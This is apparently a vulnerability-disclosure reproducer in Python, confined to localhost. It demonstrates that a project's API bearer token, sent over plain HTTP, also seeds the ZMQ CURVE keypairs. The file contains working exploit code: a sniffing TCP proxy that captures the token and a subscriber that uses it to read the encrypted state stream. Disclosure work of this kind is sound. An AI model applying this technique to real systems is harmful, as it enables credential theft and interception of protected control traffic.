"""One sniffed HTTP request defeats the ZMQ CURVE encryption.

MADDENING_API_TOKEN is simultaneously (a) the HTTP bearer credential,
which the API sends in cleartext on every request because there is no
TLS, and (b) the seed for BOTH CURVE keypairs that protect the state and
command streams.  So a passive observer on the network that the release
tells you to put the API on learns, from one request, the key to the
"encrypted" transports.

Everything here is on 127.0.0.1: the "network" is a recording TCP pump
standing in for the path between a client and a non-loopback server.
"""
import re, socket, threading, time
import zmq
from maddening.api.auth import APIAuth
from maddening.transport_auth import TransportAuth
from maddening.viz.network import NetworkRelay

OPERATOR_TOKEN = "s3cret-operator-token"
STATE = {"robot": {"joint_angle": 1.25, "secret_position": 42.0}}


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class Sniffer(threading.Thread):
    """Records client->server bytes while pumping them through."""

    def __init__(self, listen_port, target_port):
        super().__init__(daemon=True)
        self.captured = bytearray()
        self._srv = socket.socket()
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind(("127.0.0.1", listen_port))
        self._srv.listen(4)
        self._srv.settimeout(0.5)
        self._target, self._stop = target_port, threading.Event()

    def run(self):
        while not self._stop.is_set():
            try:
                c, _ = self._srv.accept()
            except (socket.timeout, OSError):
                continue
            try:
                u = socket.create_connection(("127.0.0.1", self._target))
            except OSError:
                c.close(); continue
            threading.Thread(target=self._pump, args=(c, u, True), daemon=True).start()
            threading.Thread(target=self._pump, args=(u, c, False), daemon=True).start()

    def _pump(self, a, b, record):
        try:
            while not self._stop.is_set():
                d = a.recv(65536)
                if not d:
                    break
                if record:
                    self.captured += d
                b.sendall(d)
        except OSError:
            pass
        finally:
            for s in (a, b):
                try: s.close()
                except OSError: pass

    def stop(self):
        self._stop.set()
        try: self._srv.close()
        except OSError: pass


class FakeGM:
    timestep = 0.01
    def __init__(self): self._obs = []
    def add_observer(self, cb): self._obs.append(cb)
    def emit(self, s):
        for cb in self._obs: cb("step", s)


def step1_sniff_the_http_bearer_token():
    """A victim makes ONE authenticated API call; we read the header."""
    import http.server, urllib.request

    api_port, sniff_port = free_port(), free_port()
    auth = APIAuth(bind_host="0.0.0.0", token=OPERATOR_TOKEN, environ={})
    assert auth.enforced, "a 0.0.0.0 bind must enforce the bearer token"

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            presented = (self.headers.get("authorization") or "").partition(" ")[2]
            ok = auth.verify(presented)
            self.send_response(200 if ok else 401)
            self.end_headers()
            self.wfile.write(b"ok" if ok else b"no")
        def log_message(self, *a): pass

    srv = http.server.HTTPServer(("127.0.0.1", api_port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    sniffer = Sniffer(sniff_port, api_port)
    sniffer.start()
    time.sleep(0.2)

    req = urllib.request.Request(
        f"http://127.0.0.1:{sniff_port}/graph",
        headers={"Authorization": f"Bearer {auth.token}"},
    )
    with urllib.request.urlopen(req, timeout=5) as r:
        assert r.status == 200, r.status
    time.sleep(0.2)
    sniffer.stop(); srv.shutdown()

    m = re.search(rb"[Aa]uthorization:\s*Bearer\s+(\S+)", bytes(sniffer.captured))
    assert m, "no bearer header in the capture -- this reproducer proves nothing"
    return m.group(1).decode()


def step2_read_the_secured_stream_with_it(stolen):
    """Derive the CURVE client keypair from the stolen token and subscribe."""
    port = free_port()
    relay = NetworkRelay(address=f"tcp://0.0.0.0:{port}", token=OPERATOR_TOKEN)
    assert relay.secure is True, "the relay must be the CURVE-protected one"
    gm = FakeGM(); relay.attach(gm)

    ctx = zmq.Context()
    sub = ctx.socket(zmq.SUB)
    sub.setsockopt(zmq.LINGER, 0)
    TransportAuth(token=stolen).secure_client(sub)   # <- only the sniffed token
    sub.setsockopt_string(zmq.SUBSCRIBE, "")
    sub.connect(f"tcp://127.0.0.1:{port}")

    payload = None
    deadline = time.monotonic() + 6.0
    while time.monotonic() < deadline and payload is None:
        gm.emit(STATE)
        try:
            payload = sub.recv(zmq.NOBLOCK)
        except zmq.Again:
            time.sleep(0.02)
    sub.close(); ctx.term(); relay.close()
    return payload


if __name__ == "__main__":
    stolen = step1_sniff_the_http_bearer_token()
    print(f"[1] sniffed from a cleartext HTTP request: MADDENING_API_TOKEN={stolen!r}")
    print(f"    matches the operator's token: {stolen == OPERATOR_TOKEN}")
    pub, _ = TransportAuth(token=stolen).server_keypair()
    print(f"[2] derived CURVE server public key: {pub.decode()}")
    payload = step2_read_the_secured_stream_with_it(stolen)
    print(f"[3] frame read off the CURVE-'protected' PUB socket: {payload}")
    assert payload is not None and b"secret_position" in payload, \
        "the attack failed -- good news, but then this reproducer is wrong"
    print("\nRESULT: one sniffed HTTP request -> full plaintext of the "
          "state/command streams.")
